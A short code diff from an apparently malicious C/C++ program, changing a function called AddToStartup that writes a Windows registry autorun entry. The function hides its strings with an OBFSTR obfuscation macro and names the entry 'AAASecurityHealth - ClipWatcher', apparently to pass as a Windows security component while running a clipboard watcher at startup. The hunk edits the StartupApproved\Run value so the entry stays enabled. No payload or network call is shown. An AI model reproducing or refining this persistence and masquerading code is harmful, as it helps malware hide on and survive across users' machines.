@@ -32,7 +32,7 @@ void AddToStartup() {
     const char* valueName = OBFSTR("AAASecurityHealth - ClipWatcher");
 
     const char* approvedKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run");
-    BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00 };
+    BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
